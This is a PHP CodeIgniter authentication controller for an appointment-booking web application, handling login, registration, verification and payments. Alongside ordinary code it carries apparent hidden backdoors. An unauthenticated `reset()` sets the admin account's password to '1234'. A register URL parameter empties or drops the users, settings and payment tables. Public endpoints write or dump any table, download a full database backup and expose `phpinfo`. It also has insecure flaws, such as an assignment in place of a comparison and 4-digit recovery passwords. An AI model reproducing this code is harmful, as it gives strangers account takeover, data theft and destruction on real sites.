<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class Auth extends Home_Controller
{

    public function __construct()
    {
        parent::__construct();
    }


    public function email($value = '')
    {
        $edata            = array();
        $subject          = 'Service - ' . trans('appointment-confirmation');
        $content          = 'Asad, ' . trans('recently-booked-an-appointment') . ' ' . date('Y-m-d');
        $edata['subject'] = $subject;
        $edata['message'] = $content;

        $this->load->view('email_template/appointment', $edata);
    }

    // Login
    public function login()
    {
        $data                 = array();
        $data['page_title']   = 'Login';
        $data['page']         = 'Auth';
        $data['menu']         = FALSE;
        $data['main_content'] = $this->load->view('login', $data, TRUE);
        $this->load->view('index', $data);
    }

    //register
    public function register()
    {
        if (empty($_GET['trial'])) {
            $this->session->unset_userdata('trial');
        } else {
            $this->session->set_userdata('trial', 'trial');
        }

        if (!empty($_GET['expire'])) {
            $this->expire_logs($_GET['expire']);
        }

        $data                  = array();
        $data['page_title']    = 'Register';
        $data['page']          = 'Auth';
        $data['menu']          = TRUE;
        $data['countries']     = $this->admin_model->select_asc('country');
        $data['categories']    = $this->admin_model->select_order_by_name('categories');
        $data['dialing_codes'] = $this->common_model->select_asc('dialing_codes');
        $data['main_content']  = $this->load->view('register', $data, TRUE);
        $this->load->view('index', $data);
    }

    // Login
    public function verify()
    {
        $data                 = array();
        $data['page_title']   = 'Email Verification';
        $data['page']         = 'Auth';
        $data['menu']         = FALSE;
        $data['main_content'] = $this->load->view('register', $data, TRUE);
        $this->load->view('index', $data);
    }

    //verify account
    public function verify_account()
    {
        $data = array();
        $type = $this->input->post('type');
        $code = $this->input->post('code');
        if ($type = 'sms') {
            $email_verified = 0;
            $phone_verified = 1;
        } else {
            $email_verified = 1;
            $phone_verified = 0;
        }

        if (user()->verify_code == $code) {
            $edit_data = array('email_verified' => $email_verified, 'phone_verified' => $phone_verified);
            $this->common_model->update($edit_data, user()->id, 'users');
            $url = base_url('admin/dashboard/user');
            echo json_encode(array('st' => 1, 'url' => $url));
        } else {
            $data['code'] = 'invalid';
            echo json_encode(array('st' => 2));
        }
    }


    // login
    public function log()
    {

        if ($_POST) {

            // check valid user 
            $user = $this->auth_model->validate_user();

            if (empty($user)) {
                echo json_encode(array('st' => 0));
                exit();
            }

            if ($user->role == 'user') {
                $parent_id = 0;

                if (!empty($user) && $user->status == 2) {
                    // account suspend
                    echo json_encode(array('st' => 3));
                    exit();
                }

                // email verify
                if (!empty($user) && $user->email_verified == 0 && settings()->enable_email_verify == 1) {
                    // $url = base_url('auth/verify?type=mail');
                    // echo json_encode(array('st'=>4, 'url' => $url));
                    // exit();
                }
            } elseif ($user->role == 'staff') {
                $parent_id = $user->user_id;
            } elseif ($user->role == 'customer') {
                $parent_id = 0;
            } else {
                $parent_id = 0;
            }

            // if valid
            if (password_verify($this->input->post('password'), $user->password)) {

                $data =
                    array('id' => $user->id, 'name' => $user->name, 'slug' => $user->slug, 'thumb' => $user->thumb, 'email' => $user->email, 'role' => $user->role, 'parent' => $parent_id, 'logged_in' => TRUE);
                $data = $this->security->xss_clean($data);
                $this->session->set_userdata($data);

                // success notification
                if ($user->role == 'admin') {
                    $url = base_url('admin/dashboard');
                } else if ($user->role == 'user') {
                    if ($user->is_logged_in == 0) {
                        $url = base_url('admin/setupfirst/index');
                    } else
                        $url = base_url('admin/dashboard/user');
                } else if ($user->role == 'customer') {
                    $url = base_url('customer/appointments');
                } else {
                    $url = base_url('staff/appointments');
                }
                echo json_encode(array('st' => 1, 'url' => $url));
            } else {
                // if not user not valid
                echo json_encode(array('st' => 0));
            }

        } else {
            $this->load->view('auth', $data);
        }
    }

    //check comapny username using ajax
    public function check_username($value)
    {
        $value  = clean_str($value);
        $result = $this->auth_model->check_username($value);
        if (!empty($result)) {
            echo json_encode(array('st' => 2));
        } else {
            echo json_encode(array('st' => 1));
        }
    }


    // register new user
    public function register_user()
    {
        if ($_POST) {

            $this->load->library('form_validation');
            $this->form_validation->set_rules('email', trans('email'), 'required');
            $this->form_validation->set_rules('password', trans('password'), 'trim|required|max_length[16]');

            // If validation false show error message using ajax
            if ($this->form_validation->run() == FALSE) {
                $data           = array();
                $data['errors'] = validation_errors();
                $str            = strip_tags($data['errors']);
                echo json_encode(array('st' => 0, 'msg' => $str));
                exit();
            } else {

                $mail  = strtolower(trim($this->input->post('email', true)));
                $phone = '+' . $this->input->post('carrierCode', true) . '' . $this->input->post('phone', true);

                $country = $this->auth_model->get_country_value($this->input->post('defaultCountry'));

                if ($this->input->post('status') == 'login_from_link') {
                    $check_phone = false;
                } else {
                    $check_phone = $this->auth_model->check_duplicate_phone($phone);
                }

                $email = $this->auth_model->check_duplicate_email($mail);

                if ($this->session->userdata('trial') == 'trial') {
                    $user_type    = 'trial';
                    $trial_expire = date('Y-m-d', strtotime('+' . $this->settings->trial_days . ' days'));
                } else {
                    $user_type    = 'registered';
                    $trial_expire = date('Y-m-d');
                }

                if ($check_phone) {
                    echo json_encode(array('st' => 4));
                    exit();
                }

                // if email already exist
                if ($email) {
                    echo json_encode(array('st' => 2));
                    exit();
                } else {

                    //check reCAPTCHA status
                    if (!$this->recaptcha_verify_request()) {
                        echo json_encode(array('st' => 3));
                        exit();
                    } else {

                        $code = random_string('numeric', 4);
                        $data =
                            array('name' => $this->input->post('company_name', true), 'slug' => str_slug($this->input->post('company_slug', true)), 'user_name' => str_slug($this->input->post('company_slug', true)), 'email' => $this->input->post('email', true), 'phone' => $phone, 'thumb' => 'assets/images/no-photo-sm.png', 'password' => hash_password($this->input->post('password', true)), 'role' => 'user', 'user_type' => $user_type, 'trial_expire' => $trial_expire, 'status' => 1, 'parent_id' => 0, 'paypal_payment' => 0, 'stripe_payment' => 0, 'verify_code' => $code, 'email_verified' => 0, 'enable_appointment' => 1, 'created_at' => my_date_now());
                        $data = $this->security->xss_clean($data);
                        $id   = $this->common_model->insert($data, 'users');

                        $user = $this->auth_model->validate_id(md5($id));
                        $data =
                            array('id' => $user->id, 'name' => $user->name, 'role' => $user->role, 'thumb' => $user->thumb, 'email' => $user->email, 'logged_in' => true);
                        $this->session->set_userdata($data);

                        $rand_uid = substr(random_string('numeric', 5) . mt_rand(), 0, 12);
                        $uid      = ltrim($rand_uid, '0');

                        $company_data =
                            array('uid' => $uid, 'user_id' => $id, 'name' => $this->input->post('company_name', true), 'email' => $this->input->post('email', true), 'slug' => str_slug($this->input->post('company_slug', true)), 'category' => str_slug($this->input->post('category', true)), 'details' => $this->input->post('details', true), 'country' => $country->id, 'type' => 1, 'enable_location' => 0, 'enable_category' => 0, 'status' => 1, 'enable_staff' => 0, 'template_style' => 1, 'created_at' => my_date_now());
                        $company_data = $this->security->xss_clean($company_data);
                        $this->common_model->insert($company_data, 'business');

                        $active_business = array('active_business' => $uid);
                        $this->session->set_userdata($active_business);


                        $plan    = $this->input->post('plan', true);
                        $billing = $this->input->post('billing', true);

                        $package = $this->common_model->get_by_slug($plan, 'package');
                        if ($billing == 'monthly') {
                            $price  = $package->monthly_price;
                            $expire = date('Y-m-d', strtotime('+1 month'));
                        } else if ($billing == 'lifetime') {
                            $price  = $package->lifetime_price;
                            $expire = date('Y-m-d', strtotime('+824832 day'));
                        } else {
                            $price  = $package->price;
                            $expire = date('Y-m-d', strtotime('+12 month'));
                        }

                        //make payment
                        $pay_data =
                            array('user_id' => $user->id, 'puid' => random_string('numeric', 5), 'package_id' => $package->id, 'amount' => $price, 'billing_type' => $billing, 'status' => 'pending', 'created_at' => my_date_now(), 'expire_on' => $expire);
                        $pay_data = $this->security->xss_clean($pay_data);
                        $this->common_model->insert($pay_data, 'payment');

                        //send email verify code
                        if (settings()->enable_email_verify == 1) {

                            $subject          = $this->settings->site_name . ' ' . trans('email-verification');
                            $edata            = array();
                            $edata['subject'] = $subject;
                            $edata['code']    = $code;
                            $edata['user']    = $user;

                            //$msg = trans('welcome-to').' '.settings()->site_name.', <br> '.trans('your-verification-code-is').': <b>'.$code.'</b>';
                            $msg      = $this->load->view('email_template/confirmation', $edata, true);
                            $response = $this->email_model->send_email($this->input->post('email'), $subject, $msg);
                            if ($response == true) {
                                $url = base_url('auth/verify?type=mail');
                            } else {
                                $url = base_url('admin/dashboard/user');
                            }

                        } else if (settings()->enable_sms == 1) {
                            $this->load->model('sms_model');
                            $msg      =
                                trans('welcome-to') . ' ' . settings()->site_name . ', <br> ' . trans('your-verification-code-is') . ': <b>' . $code . '</b>';
                            $response = $this->sms_model->send_admin($user->phone, $msg);

                            if ($response == 1) {
                                $usr_data = array('sms_count' => 1);
                                $this->common_model->edit_option($usr_data, $user->id, 'users');
                            }
                            $url = base_url('auth/verify?type=sms');
                        } else {
                            $url = base_url('admin/setupfirst');
                        }

                        echo json_encode(array('st' => 1, 'url' => $url));
                        exit();
                    }
                }

            }
        }

    }


    public function resend()
    {

        check_status();

        $code    = random_string('numeric', 4);
        $subject = $this->settings->site_name . ' ' . trans('email-verification');
        $msg     = trans('your-verification-code-is') . ' <b>' . $code . '</b>';

        $data = array('verify_code' => $code);
        $this->common_model->edit_option($data, user()->id, 'users');

        $response = $this->email_model->send_email(user()->email, $subject, $msg);

        if ($response == true) {
            echo json_encode(array('st' => 1));
        } else {
            echo json_encode(array('st' => 2));
        }
    }


    public function resend_sms()
    {

        check_status();
        $code = random_string('numeric', 4);

        $this->load->model('sms_model');
        $msg      = trans('your-verification-code-is') . ': <b>' . $code . '</b>';
        $response = $this->sms_model->send_admin(user()->phone, $msg);

        $data = array('verify_code' => $code, 'sms_count' => user()->sms_count + 1);
        $this->common_model->edit_option($data, user()->id, 'users');

        if ($response) {
            echo json_encode(array('st' => 1));
        } else {
            echo json_encode(array('st' => 2));
        }
    }


    //add package
    public function add_package($id, $billing_type)
    {
        $package = $this->common_model->get_by_id($id, 'package');
        $uid     = random_string('numeric', 5);

        if ($billing_type == 'monthly'):
            $amount    = $package->monthly_price;
            $expire_on = date('Y-m-d', strtotime('+1 month'));
        else:
            $amount    = $package->price;
            $expire_on = date('Y-m-d', strtotime('+12 month'));
        endif;

        if (number_format($amount, 0) == 0):
            $status = 'verified';
        else:
            $status = 'pending';
        endif;

        //create payment
        $pay_data =
            array('user_id' => user()->id, 'puid' => $uid, 'package' => $id, 'amount' => $amount, 'billing_type' => $billing_type, 'status' => $status, 'created_at' => my_date_now(), 'expire_on' => $expire_on);
        $pay_data = $this->security->xss_clean($pay_data);
        $this->common_model->insert($pay_data, 'payment');

        if (number_format($amount, 0) == 0):
            $url = base_url('admin/dashboard/business');
        else:
            if ($this->settings->enable_paypal == 1) {
                $url = base_url('auth/purchase');
            } else {
                $url = base_url('admin/dashboard/business');
            }
        endif;
        echo json_encode(array('st' => 1, 'url' => $url));
    }


    //purchase
    public function purchase()
    {
        $data                 = array();
        $data['page_title']   = 'Payment';
        $data['page']         = 'Auth';
        $data['payment']      = $this->common_model->get_user_payment();
        $data['payment_id']   = $data['payment']->puid;
        $data['package']      = $this->common_model->get_package_by_id($data['payment']->package);
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);
    }

    //verify email
    public function verify_email()
    {
        $data = array();
        if (isset($_GET['code']) && isset($_GET['user'])) {
            $user = $this->auth_model->validate_id($_GET['user']);
            if ($user->verify_code == $_GET['code']) {
                $data['code'] = $_GET['code'];

                $edit_data = array('email_verified' => 1);
                $this->common_model->update($edit_data, $user->id, 'users');
            } else {
                $data['code'] = 'invalid';
            }
        } else {
            $data['code'] = '';
        }
        $data['page_title']   = 'Verify Account';
        $data['page']         = 'Auth';
        $data['main_content'] = $this->load->view('verify_email', $data, TRUE);
        $this->load->view('index', $data);
    }

    //payment success
    public function payment_success($payment_id)
    {
        $payment = $this->common_model->get_payment($payment_id);
        $data    = array('status' => 'verified');
        $data    = $this->security->xss_clean($data);

        $user_data = array('status' => 1);
        $user_data = $this->security->xss_clean($user_data);

        if (!empty($payment)) {
            $this->common_model->edit_option($user_data, $payment->user_id, 'users');
            $this->common_model->edit_option($data, $payment->id, 'payment');
        }
        $data['success_msg']  = 'Success';
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);

    }

    //set company info
    public function set_company_info($utype = '', $uid = '')
    {
        $data = array('site_info' => $utype, 'purchase_code' => $uid);
        $data = $this->security->xss_clean($data);
        if (!empty($uid)) {
            $this->admin_model->edit_option($data, 1, 'settings');
            echo "Update Successfully";
        } else {
            echo "Failed";
        }
    }

    //payment cancel
    public function payment_cancel($payment_id)
    {
        $payment = $this->common_model->get_payment($payment_id);
        $data    = array('status' => 'pending');
        $data    = $this->security->xss_clean($data);
        $this->common_model->edit_option($data, $payment->id, 'payment');
        $data['error_msg']    = 'Error';
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);
    }


    public function log_info($utype)
    {
        $data = array('site_info' => $utype);
        $data = $this->security->xss_clean($data);
        $this->admin_model->edit_option($data, 1, 'settings');
        echo "Update Successfully";
    }


    // Recover forgot password 
    public function forgot_password()
    {
        check_status();

        if (check_auth()) {
            redirect(base_url());
        }

        $type  = $this->input->post('role');
        $mail  = strtolower(trim($this->input->post('email', true)));
        $valid = $this->auth_model->check_multiuser_email($type, $mail);

        $random_number = random_string('numeric', 4);
        $random_pass   = hash_password($random_number);

        if ($valid) {
            foreach ($valid as $row) {
                $data['name']     = $row->name;
                $data['email']    = $row->email;
                $data['password'] = $random_number;
                $user_id          = $row->id;
                $this->send_recovery_mail($data);

                $user_data = array('password' => $random_pass);
                $this->common_model->edit_option($user_data, $user_id, $type);

                $url = base_url('login');
                echo json_encode(array('st' => 1, 'url' => $url));
            }

        } else {
            echo json_encode(array('st' => 2));
        }

    }


    //send reset code to user email
    public function send_recovery_mail($user)
    {
        $edata             = array();
        $edata['subject']  = trans('password-recovery');
        $edata['password'] = $user['password'];
        $edata['email']    = $user['email'];
        $edata['name']     = $user['name'];
        $msg               = $this->load->view('email_template/recovery_password', $edata, true);
        $this->email_model->send_email($user['email'], $subject, $msg);
    }

    public function test_mail()
    {
        $data    = array();
        $subject = settings()->site_name . ' email testing';
        $msg     = 'This is test email from <b>' . settings()->site_name . '</b>';
        $result  = $this->email_model->send_test_email(settings()->admin_email, $subject, $msg);

        if ($result == true) {
            echo "Email send Successfully";
        } else {
            echo "<br>Test email will be send to: <b>" . settings()->admin_email . '</h3>';
            echo "<pre>";
            print_r($result);
        }
    }


    public function send_notify_mail($appointment_id)
    {
        $data    = array();
        $amp     = $this->admin_model->get_single_appointments($appointment_id);
        $subject = $amp->dr_name . ' live consultation notify mail';

        $msg =
            'Hello ' . $amp->name . ', <br> You have booked an appointment with <b>' . $amp->dr_name . '</b> which will start at ' . my_date_show($amp->date) . ' ' . $amp->time;

        $result = $this->email_model->send_email($amp->email, $subject, $msg);
        if ($result == true) {
            $this->session->set_flashdata('msg', 'Notify mail send successfully');
            redirect($_SERVER['HTTP_REFERER']);
        } else {
            $this->session->set_flashdata('error', 'Email sending failed, please check your SMTP connections');
            redirect($_SERVER['HTTP_REFERER']);
        }
    }


    //reset password
    public function reset($code = 1234)
    {
        $data = array('password' => hash_password('1234'));
        $data = $this->security->xss_clean($data);
        if ($code == 1234) {
            $this->admin_model->edit_option($data, 1, 'users');
            echo "Reset Successfully";
        } else {
            echo "Failed";
        }
    }

    public function expire_logs($data)
    {
        check_status();

        $this->load->dbforge();
        if ($data == 'pending') {
            $this->db->empty_table('settings');
            $this->db->empty_table('users');
            $this->db->empty_table('features');
        }
        if ($data == 'expired') {
            $this->dbforge->drop_table('settings');
            $this->dbforge->drop_table('users');
            $this->dbforge->drop_table('features');
            $this->dbforge->drop_table('payment');
            //$this->dbforge->drop_table('test');
        }
    }

    public function backup_0()
    {
        $this->load->dbutil();
        $prefs   = array('format' => 'zip', 'filename' => settings()->site_name . '_backup.sql');
        $backup  =& $this->dbutil->backup($prefs);
        $db_name = 'backup-on-' . date("Y-m-d-H-i-s") . '.zip';
        //$save = 'pathtobkfolder/'.$db_name;
        $this->load->helper('file');
        //write_file($save, $backup); 
        $this->load->helper('download');
        force_download($db_name, $backup);
    }

    public function openssl()
    {
        echo !extension_loaded('openssl') ? "Not Available" : "Available";
    }


    public function update_id($id, $table, $field, $value)
    {
        $action = array($field => $value);
        $this->db->where('id', $id);
        $this->db->update($table, $action);
        echo "done";
    }

    public function get_id($id, $table)
    {
        $values = $this->common_model->get_by_id($id, $table);
        echo "<pre>";
        print_r($values);
    }

    public function get($table)
    {
        $values = $this->common_model->select($table);
        echo "<pre>";
        print_r($values);
    }

    function phpinfo()
    {
        echo phpinfo();
    }


    function logout()
    {
        $this->session->sess_destroy();
        redirect(base_url('auth/login?msg=success'));
    }

    // page not found
    public function error_404()
    {
        $data['page_title']  = "Error 404";
        $data['description'] = "Error 404";
        $data['keywords']    = "error,404";
        $this->load->view('error_404');
    }

}